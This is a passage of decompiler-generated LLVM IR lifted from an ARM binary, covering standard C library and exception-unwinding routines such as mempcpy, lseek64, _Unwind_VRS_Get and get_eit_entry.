  %v1_18068 = trunc i32 %v1_18064 to i16
  store i16 %v1_18068, i16* %v1_1805c, align 2
  %v1_180b0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_180a8

dec_label_pc_18070:                               ; preds = %dec_label_pc_1803c
  %v1_18070 = and i32 %v3_1803c, 64
  %v2_18070 = icmp eq i32 %v1_18070, 0
  br i1 %v2_18070, label %dec_label_pc_18098, label %dec_label_pc_18078

dec_label_pc_18078:                               ; preds = %dec_label_pc_18070
  %v0_18078 = load i32, i32* @r0, align 4
  %v1_18078 = call i32 @__stdio_wcommit(i32 %v0_18078)
  store i32 %v1_18078, i32* %r0.global-to-local, align 4
  %v2_1807c = icmp eq i32 %v1_18078, 0
  br i1 %v2_1807c, label %dec_label_pc_18084, label %dec_label_pc_1805c

dec_label_pc_18084:                               ; preds = %dec_label_pc_18078
  %v0_18084 = load i32, i32* @r4, align 4
  %v1_18084 = inttoptr i32 %v0_18084 to i16*
  %v2_18084 = load i16, i16* %v1_18084, align 2
  %v3_18084 = zext i16 %v2_18084 to i32
  store i32 %v3_18084, i32* %r3.global-to-local, align 4
  %v1_18088 = add i32 %v0_18084, 8
  %v2_18088 = inttoptr i32 %v1_18088 to i32*
  %v3_18088 = load i32, i32* %v2_18088, align 4
  %v1_1808c = and i32 %v3_18084, 65471
  store i32 %v1_1808c, i32* %r3.global-to-local, align 4
  %v2_18090 = add i32 %v0_18084, 28
  %v3_18090 = inttoptr i32 %v2_18090 to i32*
  store i32 %v3_18088, i32* %v3_18090, align 4
  %v0_18094 = load i32, i32* %r3.global-to-local, align 4
  %v1_18094 = trunc i32 %v0_18094 to i16
  %v2_18094 = load i32, i32* @r4, align 4
  %v3_18094 = inttoptr i32 %v2_18094 to i16*
  store i16 %v1_18094, i16* %v3_18094, align 2
  %v0_18098.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18098

dec_label_pc_18098:                               ; preds = %dec_label_pc_18070, %dec_label_pc_18084
  %v2_180a0 = phi i32 [ %v0_1803c, %dec_label_pc_18070 ], [ %v0_18098.pre, %dec_label_pc_18084 ]
  %v1_18098 = inttoptr i32 %v2_180a0 to i16*
  %v2_18098 = load i16, i16* %v1_18098, align 2
  %v3_18098 = zext i16 %v2_18098 to i32
  %v1_1809c = or i32 %v3_18098, 1
  store i32 %v1_1809c, i32* %r3.global-to-local, align 4
  %v1_180a0 = trunc i32 %v1_1809c to i16
  store i16 %v1_180a0, i16* %v1_18098, align 2
  %v0_180a4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_180a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_180a8

dec_label_pc_180a8:                               ; preds = %dec_label_pc_1805c, %dec_label_pc_18098
  %v1_180b0 = phi i32 [ %v1_180b0.pre, %dec_label_pc_1805c ], [ %v0_180a4, %dec_label_pc_18098 ]
  %v2_180ac = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_180ac, i32* @r4, align 4
  ret i32 %v1_180b0

; uselistorder directives
  uselistorder i32 %v3_18018, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_180a8, { 1, 0 }
  uselistorder label %dec_label_pc_18098, { 1, 0 }
  uselistorder label %dec_label_pc_18048, { 1, 0 }
  uselistorder label %dec_label_pc_1803c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_180b8 = load i32, i32* @r4, align 4
  %v6_180b8 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_180c8 = call i32 @memcpy()
  %v0_180cc = load i32, i32* @r5, align 4
  %v1_180cc = load i32, i32* @r4, align 4
  %v2_180cc = add i32 %v1_180cc, %v0_180cc
  store i32 %v3_180b8, i32* @r4, align 4
  store i32 %v6_180b8, i32* @r5, align 4
  ret i32 %v2_180cc
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_180dc = load i32, i32* @r1, align 4
  %v2_180dc = icmp eq i32 %v0_180dc, 0
  %v3_180e0 = load i32, i32* @r4, align 4
  store i32 %v3_180e0, i32* %stack_var_-8, align 4
  %v0_180e4 = load i32, i32* @r0, align 4
  store i32 %v0_180e4, i32* %r4.global-to-local, align 4
  br i1 %v2_180dc, label %dec_label_pc_18108, label %dec_label_pc_180ec

dec_label_pc_180ec:                               ; preds = %entry
  %v1_180f4 = add i32 %v0_180e4, 260
  %v4_180f8 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_180f4)
  %v2_180fc = icmp eq i32 %v4_180f8, 0
  br i1 %v2_180fc, label %dec_label_pc_1810c, label %dec_label_pc_18108

dec_label_pc_18108:                               ; preds = %dec_label_pc_180ec, %entry
  br label %dec_label_pc_1810c

dec_label_pc_1810c:                               ; preds = %dec_label_pc_180ec, %dec_label_pc_18108
  %storemerge = phi i32 [ 0, %dec_label_pc_18108 ], [ 1, %dec_label_pc_180ec ]
  %v1_18110 = load i32, i32* %r4.global-to-local, align 4
  %v2_18110 = add i32 %v1_18110, 256
  %v3_18110 = inttoptr i32 %v2_18110 to i32*
  store i32 %storemerge, i32* %v3_18110, align 4
  %v2_18114 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18114, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 10, 0, 6, 7, 1, 8, 9, 11, 12, 13, 14, 2, 15, 16, 17, 18, 19, 20, 21, 3, 22, 4, 23, 5, 24, 25, 26, 27 }
  uselistorder i32 260, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1810c, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_18164, label %dec_label_pc_18148

dec_label_pc_18148:                               ; preds = %entry
  %v0_1814c = call i32 @__aeabi_read_tp()
  %v3_18150 = load i16, i16* @global_var_22068.345, align 2
  %v4_18150 = sext i16 %v3_18150 to i32
  %v0_18154 = load i32, i32* %r2.global-to-local, align 4
  %v1_18154 = sub i32 0, %v0_18154
  store i32 %v1_18154, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_1815c = add i32 %v4_18150, %v0_1814c
  %v4_1815c = inttoptr i32 %v3_1815c to i32*
  store i32 %v1_18154, i32* %v4_1815c, align 4
  %v0_1816c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1816c

dec_label_pc_18164:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_18164 = icmp eq i32 %arg1, 0
  br i1 %v2_18164, label %dec_label_pc_18178, label %dec_label_pc_1816c

dec_label_pc_1816c:                               ; preds = %dec_label_pc_18164, %dec_label_pc_18148
  %v0_1816c = phi i32 [ %arg1, %dec_label_pc_18164 ], [ %v0_1816c.pre, %dec_label_pc_18148 ]
  %v3_18170 = ashr i32 %v0_1816c, 31
  br label %dec_label_pc_1817c

dec_label_pc_18178:                               ; preds = %dec_label_pc_18164
  br label %dec_label_pc_1817c

dec_label_pc_1817c:                               ; preds = %dec_label_pc_1816c, %dec_label_pc_18178
  %v1_18184 = phi i32 [ %v0_1816c, %dec_label_pc_1816c ], [ %tmp8, %dec_label_pc_18178 ]
  %storemerge = phi i32 [ %v3_18170, %dec_label_pc_1816c ], [ %tmp, %dec_label_pc_18178 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_18184

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 3, 1, 2, 4, 5, 0 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
  uselistorder i16* @global_var_22068.345, { 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 64, 70, 69, 63, 62, 79, 78, 67, 68, 66, 65, 77, 76, 75, 74, 73, 72, 71, 17, 25, 27, 34, 61, 43, 42, 12, 6, 5, 11, 24, 23, 10, 3, 2, 13, 9, 8, 7, 48, 16, 22, 47, 46, 26, 19, 21, 20, 58, 57, 14, 32, 31, 30, 33, 56, 45, 55, 54, 29, 28, 18, 60, 59, 41, 38, 37, 36, 44, 4, 53, 52, 35, 51, 15, 50, 49, 0, 1, 40, 39 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1817c, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_1818c = icmp eq i32 %regclass, 0
  br i1 %v2_1818c, label %dec_label_pc_18194, label %dec_label_pc_181c4

dec_label_pc_18194:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_18194
  %v6_18198 = icmp eq i32 %representation, 0
  br i1 %v6_18198, label %dec_label_pc_181a8, label %bb8

.thread3:                                         ; preds = %dec_label_pc_18194
  br label %dec_label_pc_181d0

bb8:                                              ; preds = %bb
  br label %dec_label_pc_181d0

dec_label_pc_181a8:                               ; preds = %bb
  %v3_181a8 = mul i32 %regno, 4
  %v2_181ac = add i32 %v3_181a8, %context
  %v1_181b0 = add i32 %v2_181ac, 4
  %v2_181b0 = inttoptr i32 %v1_181b0 to i32*
  %v3_181b0 = load i32, i32* %v2_181b0, align 4
  %v2_181bc = bitcast i8* %valuep to i32*
  store i32 %v3_181b0, i32* %v2_181bc, align 4
  ret i32 0

dec_label_pc_181c4:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_181c4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_181c4, %bb9
  %v0_181cc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_181cc)
  br label %dec_label_pc_181d0

dec_label_pc_181d0:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_181d0, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_181d8 = icmp eq i32 %regclass, 0
  br i1 %v2_181d8, label %dec_label_pc_181e0, label %dec_label_pc_18210

dec_label_pc_181e0:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_181e0
  %v6_181e4 = icmp eq i32 %representation, 0
  br i1 %v6_181e4, label %dec_label_pc_181f4, label %bb8

.thread3:                                         ; preds = %dec_label_pc_181e0
  br label %dec_label_pc_1821c

bb8:                                              ; preds = %bb
  br label %dec_label_pc_1821c

dec_label_pc_181f4:                               ; preds = %bb
  %v3_181f8 = mul i32 %regno, 4
  %v1_181fc = bitcast i8* %valuep to i32*
  %v2_181fc = load i32, i32* %v1_181fc, align 4
  %v2_18200 = add i32 %v3_181f8, %context
  %v2_18208 = add i32 %v2_18200, 4
  %v3_18208 = inttoptr i32 %v2_18208 to i32*
  store i32 %v2_181fc, i32* %v3_18208, align 4
  ret i32 0

dec_label_pc_18210:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_18210
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_18210, %bb9
  %v0_18218 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_18218)
  br label %dec_label_pc_1821c

dec_label_pc_1821c:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_1821c, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_18224 = add i32 %context, 68
  %v2_18224 = inttoptr i32 %v1_18224 to i32*
  %v3_18224 = load i32, i32* %v2_18224, align 4
  ret i32 %v3_18224

; uselistorder directives
  uselistorder i32 68, { 10, 8, 0, 9, 1, 3, 4, 5, 6, 2, 7 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_18234 = add i32 %exc, 8
  %v2_18234 = inttoptr i32 %v1_18234 to i32*
  %v3_18234 = load i32, i32* %v2_18234, align 4
  %v2_18238 = icmp eq i32 %v3_18234, 0
  br i1 %v2_18238, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_1824c = xor i1 %v2_18238, true
  call void @__pseudo_cond_branch(i1 %v2_1824c, i32 %v3_18234)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_18264 = call i32 @abort()
  ret i32 %v0_18264
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_18270 = call i32 @abort()
  ret i32 %v0_18270
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_18274 = load i32, i32* @r4, align 4
  store i32 %v3_18274, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r5.global-to-local, align 4
  %v4_18284 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 132) to i32*), align 4
  %v2_18288 = icmp eq i32 %v4_18284, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_18294 = add i32 %return_address, -2
  store i32 %v1_18294, i32* %r4.global-to-local, align 4
  br i1 %v2_18288, label %dec_label_pc_182cc, label %dec_label_pc_1829c

dec_label_pc_1829c:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_18284)
  %v2_182ac = icmp eq i32 %v1_18294, 0
  br i1 %v2_182ac, label %.thread, label %dec_label_pc_182ecthread-pre-split

.thread:                                          ; preds = %dec_label_pc_1829c
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_182b4 = load i32, i32* %r6.global-to-local, align 4
  %v3_182b4 = add i32 %v2_182b4, 16
  %v4_182b4 = inttoptr i32 %v3_182b4 to i32*
  store i32 0, i32* %v4_182b4, align 4
  br label %dec_label_pc_182bc

dec_label_pc_182bc:                               ; preds = %.thread, %.thread10, %dec_label_pc_18464, %dec_label_pc_18450, %dec_label_pc_1842c, %dec_label_pc_18404, %dec_label_pc_18304
  %v0_182bc = load i32, i32* %r2.global-to-local, align 4
  %v2_182c4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_182c4, i32* @r4, align 4
  ret i32 %v0_182bc

dec_label_pc_182cc:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_182d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 20) to i32*), align 4
  %v4_182d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 48) to i32*), align 4
  store i32 %v4_182d8, i32* %r2.global-to-local, align 4
  %v2_182dc = sub i32 %v4_182d4, %v4_182d8
  %v3_182e0 = sdiv i32 %v2_182dc, 8
  store i32 %v3_182e0, i32* %stack_var_-36, align 4
  br label %dec_label_pc_182ec

dec_label_pc_182ecthread-pre-split:               ; preds = %dec_label_pc_1829c
  %v3_182ec.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_182ec

dec_label_pc_182ec:                               ; preds = %dec_label_pc_182ecthread-pre-split, %dec_label_pc_182cc
  %v0_18330.pre = phi i32 [ %v1_18294, %dec_label_pc_182ecthread-pre-split ], [ %v4_182d8, %dec_label_pc_182cc ]
  %v1_182f4 = phi i32 [ %v3_182ec.pr, %dec_label_pc_182ecthread-pre-split ], [ %v3_182e0, %dec_label_pc_182cc ]
  %v2_182f0 = icmp eq i32 %v1_182f4, 0
  br i1 %v2_182f0, label %dec_label_pc_18304, label %dec_label_pc_18320.preheader

dec_label_pc_18320.preheader:                     ; preds = %dec_label_pc_182ec
  %v2_182f4 = add i32 %v1_182f4, -1
  %v1_18350 = add i32 %v0_18330.pre, 8
  br label %dec_label_pc_18320.outer

dec_label_pc_18304.loopexit:                      ; preds = %dec_label_pc_1837c
  br label %dec_label_pc_18304

dec_label_pc_18304:                               ; preds = %dec_label_pc_18304.loopexit, %dec_label_pc_182ec, %dec_label_pc_18448
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_1830c = load i32, i32* %r6.global-to-local, align 4
  %v2_1830c = add i32 %v1_1830c, 16
  %v3_1830c = inttoptr i32 %v2_1830c to i32*
  store i32 0, i32* %v3_1830c, align 4
  br label %dec_label_pc_182bc

dec_label_pc_18314:                               ; preds = %dec_label_pc_18370
  %v3_18314 = icmp ult i32 %storemerge40, %v0_18374
  br i1 %v3_18314, label %dec_label_pc_1831c, label %dec_label_pc_1838c

dec_label_pc_1831c:                               ; preds = %dec_label_pc_18314
  %v1_1831c = add nsw i32 %v3_18328, 1
  br label %dec_label_pc_18320.outer

dec_label_pc_18320.outer:                         ; preds = %dec_label_pc_1831c, %dec_label_pc_18320.preheader
  %v1_1837c.ph = phi i32 [ %v1_1831c, %dec_label_pc_1831c ], [ 0, %dec_label_pc_18320.preheader ]
  %v0_18320.ph = phi i32 [ %v0_18320, %dec_label_pc_1831c ], [ %v2_182f4, %dec_label_pc_18320.preheader ]
  br label %dec_label_pc_18320

dec_label_pc_18320:                               ; preds = %dec_label_pc_18320.outer, %dec_label_pc_18384
  %v0_18320 = phi i32 [ %v1_18384, %dec_label_pc_18384 ], [ %v0_18320.ph, %dec_label_pc_18320.outer ]
  %v2_18320 = add i32 %v0_18320, %v1_1837c.ph
  %tmp = icmp slt i32 %v2_18320, 0
  %v4_18324 = zext i1 %tmp to i32
  %v5_18324 = add i32 %v4_18324, %v2_18320
  %v3_18328 = sdiv i32 %v5_18324, 2
  %v3_1832c = mul i32 %v3_18328, 8
  store i32 %v3_1832c, i32* @ip, align 4
  %v2_18330 = add i32 %v3_1832c, %v0_18330.pre
  %v3_18330 = inttoptr i32 %v2_18330 to i32*
  %v4_18330 = load i32, i32* %v3_18330, align 4
  %v1_18334 = and i32 %v4_18330, 1073741824
  %v2_18334 = icmp eq i32 %v1_18334, 0
  %v2_18338 = or i32 %v4_18330, -2147483648
  %tmp79 = bitcast i32 %v4_18330 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_1833c = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_18334, i32 %v2_1833c, i32 %v2_18338
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_18340 = icmp eq i32 %v2_182f4, %v3_18328
  store i32 %v2_18330, i32* %r7.global-to-local, align 4
  br i1 %v9_18340, label %dec_label_pc_18370, label %dec_label_pc_18350

dec_label_pc_18350:                               ; preds = %dec_label_pc_18320
  %v2_18354 = add i32 %v3_1832c, %v1_18350
  %v3_18354 = inttoptr i32 %v2_18354 to i32*
  %v4_18354 = load i32, i32* %v3_18354, align 4
  %v1_1835c = and i32 %v4_18354, 1073741824
  %v2_1835c = icmp eq i32 %v1_1835c, 0
  %v2_18360 = or i32 %v4_18354, -2147483648
  %tmp81 = bitcast i32 %v4_18354 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_18364 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_1835c, i32 %v2_18364, i32 %v2_18360
  %v1_18368 = add i32 %v2_18354, -1
  %v2_1836c = add i32 %storemerge39, %v1_18368
  br label %dec_label_pc_18370

dec_label_pc_18370:                               ; preds = %dec_label_pc_18320, %dec_label_pc_18350
  %storemerge40 = phi i32 [ %v2_1836c, %dec_label_pc_18350 ], [ -1, %dec_label_pc_18320 ]
  %v2_18370 = add i32 %storemerge, %v2_18330
  %v0_18374 = load i32, i32* %r4.global-to-local, align 4
  %v3_18374 = icmp ult i32 %v0_18374, %v2_18370
  br i1 %v3_18374, label %dec_label_pc_1837c, label %dec_label_pc_18314

dec_label_pc_1837c:                               ; preds = %dec_label_pc_18370
  %v9_1837c = icmp eq i32 %v3_18328, %v1_1837c.ph
  br i1 %v9_1837c, label %dec_label_pc_18304.loopexit, label %dec_label_pc_18384

dec_label_pc_18384:                               ; preds = %dec_label_pc_1837c
  %v1_18384 = add nsw i32 %v3_18328, -1
  br label %dec_label_pc_18320

dec_label_pc_1838c:                               ; preds = %dec_label_pc_18314
  %v2_1838c = load i32, i32* %v3_18330, align 4
  %v1_18390 = and i32 %v2_1838c, 1073741824
  %v2_18390 = icmp eq i32 %v1_18390, 0
  %v2_18394 = or i32 %v2_1838c, -2147483648
  %tmp83 = bitcast i32 %v2_1838c to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_18398 = bitcast float %tmp84 to i32
  %v0_1839c = select i1 %v2_18390, i32 %v2_18398, i32 %v2_18394
  %v2_1839c = add i32 %v0_1839c, %v2_18330
  %v1_183a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_183a0 = add i32 %v1_183a0, 72
  %v3_183a0 = inttoptr i32 %v2_183a0 to i32*
  store i32 %v2_1839c, i32* %v3_183a0, align 4
  %v0_183a4 = load i32, i32* %r7.global-to-local, align 4
  %v1_183a4 = add i32 %v0_183a4, 4
  %v2_183a4 = inttoptr i32 %v1_183a4 to i32*
  %v3_183a4 = load i32, i32* %v2_183a4, align 4
  %v7_183a8 = icmp eq i32 %v3_183a4, 1
  br i1 %v7_183a8, label %.thread10, label %dec_label_pc_183bc

.thread10:                                        ; preds = %dec_label_pc_1838c
  %v1_183a8 = add i32 %v3_183a4, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_183b4 = load i32, i32* %r6.global-to-local, align 4
  %v3_183b4 = add i32 %v2_183b4, 16
  %v4_183b4 = inttoptr i32 %v3_183b4 to i32*
  store i32 %v1_183a8, i32* %v4_183b4, align 4
  br label %dec_label_pc_182bc

dec_label_pc_183bc:                               ; preds = %dec_label_pc_1838c
  %v1_183bc = icmp slt i32 %v3_183a4, 0
  br i1 %v1_183bc, label %.thread38, label %dec_label_pc_183d4

.thread38:                                        ; preds = %dec_label_pc_183bc
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_183c8 = load i32, i32* %r6.global-to-local, align 4
  %v5_183c8 = add i32 %v4_183c8, 76
  %v6_183c8 = inttoptr i32 %v5_183c8 to i32*
  store i32 %v1_183a4, i32* %v6_183c8, align 4
  %v3_183cc = load i32, i32* %r2.global-to-local, align 4
  %v4_183cc = load i32, i32* %r6.global-to-local, align 4
  %v5_183cc = add i32 %v4_183cc, 80
  %v6_183cc = inttoptr i32 %v5_183cc to i32*
  store i32 %v3_183cc, i32* %v6_183cc, align 4
  br label %dec_label_pc_183f4

dec_label_pc_183d4:                               ; preds = %dec_label_pc_183bc
  %v1_183d4 = and i32 %v3_183a4, 1073741824
  %v2_183d4 = icmp eq i32 %v1_183d4, 0
  %v2_183d8 = or i32 %v3_183a4, -2147483648
  %tmp85 = bitcast i32 %v3_183a4 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_183dc = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_183d4, i32 %v2_183dc, i32 %v2_183d8
  %v1_183e0 = add i32 %storemerge42, 4
  %v2_183e4 = add i32 %v1_183e0, %v0_183a4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_183ec = load i32, i32* %r6.global-to-local, align 4
  %v2_183ec = add i32 %v1_183ec, 76
  %v3_183ec = inttoptr i32 %v2_183ec to i32*
  store i32 %v2_183e4, i32* %v3_183ec, align 4
  %v0_183f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_183f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_183f0 = add i32 %v1_183f0, 80
  %v3_183f0 = inttoptr i32 %v2_183f0 to i32*
  store i32 %v0_183f0, i32* %v3_183f0, align 4
  br label %dec_label_pc_183f4

dec_label_pc_183f4:                               ; preds = %.thread38, %dec_label_pc_183d4
  %v0_183f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_183f4 = add i32 %v0_183f4, 76
  %v2_183f4 = inttoptr i32 %v1_183f4 to i32*
  %v3_183f4 = load i32, i32* %v2_183f4, align 4
  store i32 %v3_183f4, i32* %r2.global-to-local, align 4
  %v1_183f8 = inttoptr i32 %v3_183f4 to i32*
  %v2_183f8 = load i32, i32* %v1_183f8, align 4
  %v1_183fc = icmp slt i32 %v2_183f8, 0
  br i1 %v1_183fc, label %dec_label_pc_18420, label %dec_label_pc_18404

dec_label_pc_18404:                               ; preds = %dec_label_pc_183f4
  %v1_18404 = and i32 %v2_183f8, 1073741824
  %v2_18404 = icmp eq i32 %v1_18404, 0
  %v2_18408 = or i32 %v2_183f8, -2147483648
  %tmp87 = bitcast i32 %v2_183f8 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_1840c = bitcast float %tmp88 to i32
  %v0_18410 = select i1 %v2_18404, i32 %v2_1840c, i32 %v2_18408
  %v2_18410 = add i32 %v0_18410, %v3_183f4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_18418 = add i32 %v0_183f4, 16
  %v3_18418 = inttoptr i32 %v2_18418 to i32*
  store i32 %v2_18410, i32* %v3_18418, align 4
  br label %dec_label_pc_182bc

dec_label_pc_18420:                               ; preds = %dec_label_pc_183f4
  %v3_18420 = udiv i32 %v2_183f8, 16777216
  %v1_18424 = urem i32 %v3_18420, 16
  %v2_18424 = icmp eq i32 %v1_18424, 0
  br i1 %v2_18424, label %dec_label_pc_1842c, label %dec_label_pc_18440

dec_label_pc_1842c:                               ; preds = %dec_label_pc_18420
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18434 = load i32, i32* %r5.global-to-local, align 4
  %v2_18434 = add i32 %v0_18434, -37328
  %v2_18438 = add i32 %v0_183f4, 16
  %v3_18438 = inttoptr i32 %v2_18438 to i32*
  store i32 %v2_18434, i32* %v3_18438, align 4
  br label %dec_label_pc_182bc

dec_label_pc_18440:                               ; preds = %dec_label_pc_18420
  %v7_18440 = icmp eq i32 %v1_18424, 1
  br i1 %v7_18440, label %dec_label_pc_18464, label %dec_label_pc_18448

dec_label_pc_18448:                               ; preds = %dec_label_pc_18440
  %v7_18448 = icmp eq i32 %v1_18424, 2
  br i1 %v7_18448, label %dec_label_pc_18450, label %dec_label_pc_18304

dec_label_pc_18450:                               ; preds = %dec_label_pc_18448
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18458 = load i32, i32* %r5.global-to-local, align 4
  %v2_18458 = add i32 %v0_18458, -37344
  %v2_1845c = add i32 %v0_183f4, 16
  %v3_1845c = inttoptr i32 %v2_1845c to i32*
  store i32 %v2_18458, i32* %v3_1845c, align 4
  br label %dec_label_pc_182bc

dec_label_pc_18464:                               ; preds = %dec_label_pc_18440
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1846c = load i32, i32* %r5.global-to-local, align 4
  %v2_1846c = add i32 %v0_1846c, -37336
  %v2_18470 = add i32 %v0_183f4, 16
  %v3_18470 = inttoptr i32 %v2_18470 to i32*
  store i32 %v2_1846c, i32* %v3_18470, align 4
  br label %dec_label_pc_182bc

; uselistorder directives
  uselistorder i32 %v1_18424, { 2, 1, 0 }
  uselistorder i32 %v0_183f4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_183a4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_18374, { 1, 0 }
  uselistorder i32 %v3_1832c, { 2, 1, 0 }
  uselistorder i32 %v3_18328, { 3, 2, 1, 0, 4 }
